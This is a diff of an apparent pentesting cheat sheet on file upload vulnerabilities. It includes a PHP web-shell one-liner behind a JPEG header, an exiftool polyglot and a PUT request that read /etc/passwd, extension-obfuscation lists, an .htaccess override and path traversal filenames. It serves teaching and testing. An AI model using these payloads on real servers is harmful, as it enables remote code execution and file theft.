@@ -1,43 +1,39 @@
 ---
-title: "File upload vulnerabilities"
+title: "File Upload Vulnerabilities"
 weight: 9
-description: "Learn how file upload vulnerabilities can be exploited, including flawed validation, server misconfigurations, race conditions, and techniques for bypassing security measures."
+description: "Understand how to exploit file upload functionalities through flawed validation, misconfigurations, race conditions, and other advanced techniques."
 ---
 
-# File upload vulnerabilities
+# File Upload Vulnerabilities
+
+Improper handling of file uploads is a common security weakness in web applications. If not carefully validated, uploaded files can lead to remote code execution (RCE), cross-site scripting (XSS), and other types of attacks.
 
 {{< hint style=warning >}}
-Servers typically won't execute files unless they have been configured to do so. In some cases the contents of the file may still be served as plain text.
+**Warning**: By default, servers do not execute uploaded files unless they are explicitly configured to do so.
 {{< /hint >}}
 
-## Flawed validation of FU
+## Flawed File Validation
 
-### Content-Type
+Poor validation allows attackers to bypass filters and upload dangerous files.
 
-{{< details summary="multipart form-data" >}}
-
-When we upload binary files (like png) the content type multipart/form-data is preferred. The message body is split into separate parts for each of the form's inputs. Each part contains a `Content-Disposition` header and may also contain their own `Content-Type` header which tells the server the MIME type of the data that was submitted using this input
-
-{{< /details >}}
+### Content-Type Bypass
 
 Change `Content-Type` to an allow MIME type. (e.g. `image/jpeg`)
 
-### Blacklisted extensions
+### Dangerous File Extensions
 
-* Change extensions
+Some file extensions are known to trigger execution on the server. Even if certain types are blacklisted, you can still try alternate or obfuscated extensions:
 
 ```sh
+# Common dangerous extensions
 .php
 .php3
 .php4
 .php5
 .phtml
 .phar
-```
 
-* Obfuscating file extensions
-
-```sh
+# Obfuscation examples
 exploit.pHp
 exploit.php.jpg
 exploit.php.
@@ -47,11 +43,9 @@ exploit.asp%00.jpg
 exploit.p.phphp
 ```
 
-### File content validation
+### File Content Validation
 
-More secure servers try to verify that the contents of the file actually match what is expected.
-
-**[1] Magic number: certain file types may always contain a specific sequence of bytes in their header or footer**
+Even if the extension is valid, some servers validate the file content using magic numbers (specific byte patterns at the start of files).
 
 | File     | Hex Signature                       | ISO 8859-1   |
 | -------- | ----------------------------------- | ------------ |
@@ -61,16 +55,14 @@ More secure servers try to verify that the contents of the file actually match w
 | JPG/JPEG | FF D8 FF E0 00 10 4A 46 49 46 00 01 | ÿØÿà␀␐JFIF␀␁ |
 | PDF      | 25 50 44 46 2D                      | %PDF-        |
 
-Payload example:
+You can still inject malicious code using a valid header:
 
 ```php
 ÿØÿî
 <?php echo system($_GET['cmd']); ?>
 ```
 
-***
-
-**[2] Polyglot (on exiftool): verify certain intrinsic properties of an image, such as its dimensions.**
+### Polyglot Files
 
 Create a polyglot JPEG file containing malicious code within its metadata
 
@@ -80,16 +72,18 @@ exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' EN
 
 This works if you can upload a php extension file. This works why you have a real image file (that bypass restrictions) but when you open the image it's executed as php script.
 
-## Overriding server configuration
+## Overriding Server Configuration
 
 Many servers allow configuration files in directories to override global settings. Web servers use them when present, but they're not accessible via HTTP requests.
 
 If the file extension is blacklisted, you might trick the server into mapping a custom file extension to an executable MIME type.
 
-* Apache servers -> `.htaccess`
+* Apache servers → `.htaccess`
 * Example: `AddType application/x-httpd-php .<EXTENSION>`
 
-## PUT method
+## PUT Method Exploitation
+
+Some servers support the HTTP `PUT` method for uploading files directly.
 
 ```http
 PUT /images/exploit.php HTTP/1.1
@@ -97,33 +91,36 @@ Host: vulnerable-website.com
 Content-Type: application/x-httpd-php
 Content-Length: 49
 
-<?php echo file_get_contents('/path/to/file'); ?>
+<?php echo file_get_contents('/etc/passwd'); ?>
 ```
 
-## FU + PT
+## Path Traversal + File Upload
 
-Defense: Servers block script execution in the file upload folder. Web servers use the filename field in `multipart/form-data` requests to determine the file's name and location. -> Change filename field combining path traversal
+If execution is blocked in the upload directory but the web server use the filename field in the request to determine the file’s name and location, you can try to escape using path traversal in the `filename` field:
 
 ```http
 Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
 ```
 
 {{< hint style=tips >}}
-**Tip**: pay attention to stripping. In that case, obfuscate with `filename="..%2fexploit.php"`.
+**Tip**: If directory traversal is filtered, try encoding it: `filename="..%2fexploit.php"`.
 {{< /hint >}}
 
-## FU without RCE
+## Upload Without RCE
 
-If you can upload HTML files or SVG images, you can use tags to create stored XSS payloads. If the server parses XML-based files like `.doc` or `.xls`, it could be a vector for XXE injection attacks.
+Even without remote code execution, you can still cause harm:
 
-## FU + Race Conditions
+- Upload `.html` or `.svg` files with embedded JavaScript → **Stored XSS**
+- Upload XML files like `.docx`, `.xlsx` → Possible **XXE injection**
 
-Some websites upload files to the main filesystem and remove them if they fail validation. This is common in sites using anti-virus software to check for malware. During the short time the file exists on the server, an attacker could potentially execute it.
+## Race Conditions in File Uploads
 
-* Race conditions
-* Difficult to detect
+In some setups, files are uploaded and scanned (e.g., with antivirus) before being permanently stored. During this short window, the file may exist temporarily on disk and you could potentially execute it.
 
-### Race conditions in URL-based file uploads
+- Race conditions
+- Difficult to detect
+
+### Exploiting URL-Based Uploads
 
 If a file is loaded into a temporary directory with a randomized name, it should be impossible for an attacker to exploit any race conditions.
 
